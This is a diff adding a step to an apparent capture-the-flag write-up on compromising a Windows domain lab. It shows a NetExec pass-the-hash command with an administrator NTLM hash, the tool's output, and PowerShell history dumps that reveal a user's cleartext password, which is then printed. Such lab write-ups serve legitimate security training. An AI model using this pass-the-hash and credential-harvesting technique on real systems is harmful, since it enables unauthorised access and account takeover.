@@ -353,4 +353,33 @@ DEV01$:des-cbc-md5:64f2100131023873
 
 Now i have all the hashes for every user on the domain!
 
-The challenge also asks for `ryan` password
+The challenge also asks for `ryan` password, i have found this in powershell history
+
+```python
+nxc smb EC2AMAZ-A5O4OL8.past.local -u administrator -H '31592a42841d0a9e74f93c41d8884cd0' -M powershell_history  
+SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  [*] Windows Server 2016 Datacenter 14393 x64 (name:EC2AMAZ-A5O4OL8) (domain:past.local) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         10.0.16.121     445    EC2AMAZ-A5O4OL8  [+] past.local\administrator:31592a42841d0a9e74f93c41d8884cd0 (Pwn3d!)
+POWERSHE... 10.0.16.121     445    EC2AMAZ-A5O4OL8  C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+POWERSHE... 10.0.16.121     445    EC2AMAZ-A5O4OL8      
+POWERSHE... 10.0.16.121     445    EC2AMAZ-A5O4OL8      net user ryan 1qaz3edc!QAZ#EDC /add
+POWERSHE... 10.0.16.121     445    EC2AMAZ-A5O4OL8      net localgroup administrators /add ryan
+POWERSHE... 10.0.16.121     445    EC2AMAZ-A5O4OL8      exit
+POWERSHE... 10.0.16.121     445    EC2AMAZ-A5O4OL8      net computer
+POWERSHE... 10.0.16.121     445    EC2AMAZ-A5O4OL8      Get-ADComputer -Filter * | Select-Object Name
+POWERSHE... 10.0.16.121     445    EC2AMAZ-A5O4OL8      net use \\dev01\c$
+POWERSHE... 10.0.16.121     445    EC2AMAZ-A5O4OL8      whoami
+POWERSHE... 10.0.16.121     445    EC2AMAZ-A5O4OL8      id
+POWERSHE... 10.0.16.121     445    EC2AMAZ-A5O4OL8      net localgroup administrators
+POWERSHE... 10.0.16.121     445    EC2AMAZ-A5O4OL8      net group "domain admins"
+POWERSHE... 10.0.16.121     445    EC2AMAZ-A5O4OL8      exit
+POWERSHE... 10.0.16.121     445    EC2AMAZ-A5O4OL8  C:\Users\ryan\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt [ PASSWORD PASSW ]
+POWERSHE... 10.0.16.121     445    EC2AMAZ-A5O4OL8      net user ryan 1qaz3edc!QAZ#EDC /add
+POWERSHE... 10.0.16.121     445    EC2AMAZ-A5O4OL8      net localgroup administrators /add ryan
+POWERSHE... 10.0.16.121     445    EC2AMAZ-A5O4OL8      Get-ADUser -Filter * -Properties PasswordNeverExpires |`
+POWERSHE... 10.0.16.121     445    EC2AMAZ-A5O4OL8          Set-ADUser -PasswordNeverExpires $true`
+POWERSHE... 10.0.16.121     445    EC2AMAZ-A5O4OL8
+```
+
+```python
+ryan:1qaz3edc!QAZ#EDC
+```
